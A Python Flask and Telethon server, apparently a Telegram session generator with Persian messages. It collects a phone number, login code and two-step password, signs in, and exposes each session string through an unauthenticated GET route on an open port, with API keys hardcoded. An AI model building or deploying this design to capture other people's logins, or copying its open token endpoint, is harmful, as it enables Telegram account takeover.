# ================================================================
# Telegram Session Builder - Flask + Telethon
# By: Tiam
# ================================================================

import os
import asyncio
import threading
from flask import Flask, request, jsonify
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.sessions import StringSession

# ================= CONFIG =================
API_ID = 24645053
API_HASH = "88c0167b74a24fac0a85c26c1f6d1991"
SAVE_PATH = "sessions"

if not os.path.exists(SAVE_PATH):
    os.makedirs(SAVE_PATH)

app = Flask(__name__)

# ================= Async Loop =================
class LoopThread(threading.Thread):
    def __init__(self):
        super().__init__(daemon=True)
        self.loop = asyncio.new_event_loop()
    def run(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

async_loop_thread = LoopThread()
async_loop_thread.start()

def run_async(coro):
    future = asyncio.run_coroutine_threadsafe(coro, async_loop_thread.loop)
    return future.result()

# ================= Clients =================
clients = {}  # phone: TelegramClient
sessions = {}  # phone: StringSession

# ================= API ROUTES =================

# 1 - درخواست کد OTP
@app.route("/send_phone", methods=["POST"])
def send_phone():
    data = request.json
    phone = data.get("phone")
    if not phone:
        return jsonify({"status":"error","message":"شماره وارد نشده"})

    async def task():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        clients[phone] = client
        return True

    try:
        run_async(task())
        return jsonify({"status":"ok","message":"کد OTP ارسال شد"})
    except Exception as e:
        return jsonify({"status":"error","message":str(e)})

# 2 - ارسال کد OTP
@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")
    client = clients.get(phone)
    if not client:
        return jsonify({"status":"error","message":"کلاینت پیدا نشد"})

    async def task():
        try:
            await client.sign_in(phone=phone, code=code)
            session_str = client.session.save()
            sessions[phone] = session_str
            return {"status":"ok","message":"ورود موفق و سشن ساخته شد"}
        except SessionPasswordNeededError:
            return {"status":"2fa","message":"کد دو مرحله‌ای نیاز است"}
        except PhoneCodeInvalidError:
            return {"status":"error","message":"کد اشتباه است"}
        except Exception as e:
            return {"status":"error","message":str(e)}

    result = run_async(task())
    return jsonify(result)

# 3 - ارسال کد 2FA
@app.route("/send_2fa", methods=["POST"])
def send_2fa():
    data = request.json
    phone = data.get("phone")
    password = data.get("password")
    client = clients.get(phone)
    if not client:
        return jsonify({"status":"error","message":"کلاینت پیدا نشد"})

    async def task():
        try:
            await client.sign_in(password=password)
            session_str = client.session.save()
            sessions[phone] = session_str
            return {"status":"ok","message":"ورود کامل شد و سشن ساخته شد"}
        except Exception as e:
            return {"status":"error","message":str(e)}

    result = run_async(task())
    return jsonify(result)

# 4 - دریافت سشن‌ها (اختیاری)
@app.route("/get_session/<phone>", methods=["GET"])
def get_session(phone):
    session_str = sessions.get(phone)
    if not session_str:
        return jsonify({"status":"error","message":"سشن موجود نیست"})
    return jsonify({"status":"ok","session":session_str})

# ================= RUN APP =================
if __name__ == "__main__":
    print("Server running on http://0.0.0.0:8000")
    app.run(host="0.0.0.0", port=8000)
